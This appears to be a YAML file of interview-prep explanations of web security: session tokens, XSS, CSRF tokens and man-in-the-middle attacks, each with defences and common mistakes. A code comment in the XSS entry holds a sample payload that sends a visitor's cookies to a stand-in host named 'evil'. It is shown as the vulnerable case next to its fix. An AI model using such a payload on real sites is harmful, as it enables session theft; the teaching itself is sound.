- id: kb-82aab5c16fa6
  question: What are session tokens?
  answer: A session token is a random, unguessable identifier the server issues after login and the client
    sends with each request, usually in a cookie. The server maps it to session data, so it is easy to
    revoke. It must be long and random, sent only over HTTPS, rotated on login and expired after inactivity.
  topic: security
  tags:
  - sessions
  - authentication
  - tokens
  explanation: '## In plain words

    After you log in, the server gives you a ticket number, like a coat-check ticket. The ticket itself
    means nothing; the server keeps the matching record of who you are. Show the ticket and you are recognised;
    lose it and anyone holding it can claim your coat.


    ## How it works

    - **Issue**: after successful authentication, generate at least 128 bits from a cryptographically
    secure random generator.

    - **Store server side**: in memory, Redis or a database: user ID, creation time, last activity, maybe
    device info.

    - **Send**: in a cookie with `Secure`, `HttpOnly` and `SameSite`.

    - **Validate**: on each request, look up the token, check expiry, update last activity.

    - **End**: delete it on logout, after an idle timeout and an absolute timeout, and on password change.

    - **Rotate** the token on login and on privilege changes to block session fixation.

    - Compared with JWTs: opaque tokens need a lookup but can be revoked instantly; self-contained tokens
    avoid the lookup but are hard to revoke.


    ## Example

    ```python

    import secrets

    import time


    sessions = {}                              # in production: Redis or a database table

    token = secrets.token_urlsafe(32)          # 256 bits of randomness

    sessions[token] = {"user_id": 42, "expires": time.time() + 30 * 60}

    # response: Set-Cookie: sid=<token>; Secure; HttpOnly; SameSite=Lax

    ```


    ## Common mistakes

    - Using predictable values such as user IDs or timestamps.

    - Keeping the same token across login (fixation).

    - No expiry, so a stolen token works forever.

    - Putting the token in URLs, where it leaks into logs and `Referer` headers.


    ## In the interview

    Describe the life cycle (issue, store, send, validate, expire, rotate) and the cookie flags. Follow-ups:
    scaling sessions across servers (shared store), "log out all devices", and when you would choose JWTs
    instead.

    '
  match:
  - 82aab5c16fa6
  prompt: 1f344914
- id: kb-453014a6ade6
  question: What are XSS (cross-site scripting) attacks?
  answer: XSS happens when an attacker gets their script to run in another user's browser on your site,
    usually by injecting it through data the page renders without escaping. The script can steal tokens,
    act as the user or change the page. Defences are contextual output encoding, safe DOM APIs, sanitising
    rich HTML and a strict Content Security Policy.
  topic: security
  tags:
  - xss
  - web-security
  - owasp
  explanation: "## In plain words\nYour page shows user content, such as a comment. If the comment contains\
    \ `<script>` and you insert it as HTML, the browser runs it as if you wrote it. The attacker's code\
    \ now runs with your site's privileges for every visitor who sees the comment.\n\n## How it works\n\
    - **Stored XSS**: the payload is saved (comment, profile) and served to others.\n- **Reflected XSS**:\
    \ the payload is in a URL or form and echoed back in the response.\n- **DOM-based XSS**: front-end\
    \ code moves untrusted data into a dangerous sink such as `innerHTML`, `document.write` or `eval`.\n\
    - **Defences**:\n  - Encode output for its context (HTML body, attribute, URL, JavaScript). Modern\
    \ template engines and React escape by default.\n  - Use `textContent` instead of `innerHTML`; avoid\
    \ `dangerouslySetInnerHTML` unless sanitised.\n  - Sanitise rich HTML with a maintained library such\
    \ as DOMPurify.\n  - Set a Content Security Policy that blocks inline scripts.\n  - `HttpOnly` cookies\
    \ so scripts cannot read the session.\n\n## Example\n```js\n// Vulnerable: a name like <img src=x\
    \ onerror=\"fetch('//evil/?c='+document.cookie)\">\nel.innerHTML = `Hello, ${name}`;\n// Safe: treated\
    \ as text, never as HTML\nel.textContent = `Hello, ${name}`;\n```\n\n## Common mistakes\n- Filtering\
    \ input with a blacklist of tags instead of encoding output.\n- Thinking React makes XSS impossible;\
    \ `href=\"javascript:...\"` and raw HTML still bite.\n- Relying on CSP alone.\n- Forgetting attributes\
    \ and URLs need different escaping from HTML text.\n\n## In the interview\nName the three types, show\
    \ one vulnerable line and its fix, and list layered defences. Follow-ups: how CSP nonces work, why\
    \ `HttpOnly` limits damage but does not stop XSS, and the difference between XSS and CSRF.\n"
  match:
  - a5fac86b68de
  prompt: 1f344914
- id: kb-a57ae0487e1e
  question: What is a CSRF token, and how does it look in HTML?
  answer: A CSRF token is a secret, unpredictable value tied to the user's session that the server puts
    in its forms and checks on every state-changing request. A malicious site can make the browser send
    cookies but cannot read the token, so its forged requests fail. In HTML it is usually a hidden input
    field.
  topic: security
  tags:
  - csrf
  - web-security
  - forms
  - cookies
  explanation: "## In plain words\nCross-site request forgery (CSRF) tricks a logged-in user's browser\
    \ into sending a request to your site from another site, and the browser helpfully attaches the session\
    \ cookie. A CSRF token is a password-like value that only your own pages know, so a forged request\
    \ cannot include it.\n\n## How it works\n- The server generates a random token per session (or per\
    \ form) and stores it, or signs it.\n- It renders the token into each form as a hidden field, or exposes\
    \ it for JavaScript to send in a header such as `X-CSRF-Token`.\n- On `POST`, `PUT`, `PATCH` or `DELETE`,\
    \ the server compares the submitted token with the expected one, using a constant-time comparison,\
    \ and rejects mismatches with 403.\n- The attacker's site cannot read your page (same-origin policy),\
    \ so it cannot learn the token.\n- Supporting defences: `SameSite=Lax` or `Strict` cookies, checking\
    \ the `Origin` header, and never changing state on `GET`.\n- APIs that use tokens in an `Authorization`\
    \ header, not cookies, are not exposed to CSRF in the same way.\n\n## Example\n```html\n<form method=\"\
    post\" action=\"/transfer\">\n  <input type=\"hidden\" name=\"csrf_token\" value=\"Zx81kQ_3vT9pLm2c\"\
    >\n  <input name=\"amount\">\n  <button>Send</button>\n</form>\n```\nAn attacker's auto-submitting\
    \ form to `/transfer` arrives without the right token and is rejected.\n\n## Common mistakes\n- Putting\
    \ the token in a cookie only, which the browser sends automatically and so proves nothing.\n- Checking\
    \ it on `POST` but changing state on `GET`.\n- Using a predictable or global token.\n- Leaking it\
    \ in URLs.\n\n## In the interview\nExplain the attack first, then why the token works. Mention framework\
    \ support (most web frameworks have built-in CSRF middleware), `SameSite` cookies as a modern layer,\
    \ and the double-submit cookie pattern for stateless setups.\n"
  match:
  - 0afb25849989
  prompt: 1f344914
- id: kb-17b9d8af84a4
  question: What is a man-in-the-middle (MITM) attack?
  answer: In a MITM attack, an attacker secretly sits between two parties, relaying and possibly reading
    or changing their traffic while each side thinks it talks directly to the other. TLS with proper certificate
    validation, HSTS and authenticated key exchange are the main defences.
  topic: security
  tags:
  - mitm
  - tls
  - network-security
  explanation: "## In plain words\nImagine passing notes in class through a classmate who reads each note,\
    \ maybe rewrites it, and passes it on. Neither you nor your friend notices. That classmate is the\
    \ man in the middle.\n\n## How it works\n- **Getting in the middle**: rogue Wi-Fi hotspots, ARP spoofing\
    \ on a local network, DNS spoofing, a compromised router, or a malicious proxy.\n- **What the attacker\
    \ can do**: read plain-text traffic, steal cookies and credentials, inject scripts or malware, or\
    \ downgrade HTTPS to HTTP (SSL stripping).\n- **Defences**:\n  - TLS everywhere, with clients that\
    \ check the certificate chain and the host name.\n  - HSTS (and preload) so browsers never fall back\
    \ to HTTP.\n  - Certificate pinning in mobile apps, used with care.\n  - Mutual TLS between services.\n\
    \  - Signed updates and DNSSEC where available.\n  - VPNs on untrusted networks.\n- TLS defeats MITM\
    \ only if verification is not disabled; a client that accepts any certificate is wide open.\n\n##\
    \ Example\nA café hotspot named like the café's real network routes all traffic through the attacker.\
    \ A user types `bank.example` with no HTTPS; the attacker proxies the site over HTTP and captures\
    \ the password. With HSTS preloaded, the browser would have insisted on HTTPS, and a fake certificate\
    \ would trigger an error.\n\n## Common mistakes\n- Disabling certificate checks in code (`verify=False`)\
    \ \"just for now\".\n- Assuming encryption alone is enough without authentication of the other side.\n\
    - Forgetting internal networks; attackers inside can MITM service-to-service traffic.\n\n## In the\
    \ interview\nDefine it, give a realistic scenario, then list defences in layers. Follow-ups: how TLS\
    \ certificates prevent impersonation, SSL stripping and HSTS, and why corporate TLS inspection is\
    \ a sanctioned MITM with its own risks.\n"
  match:
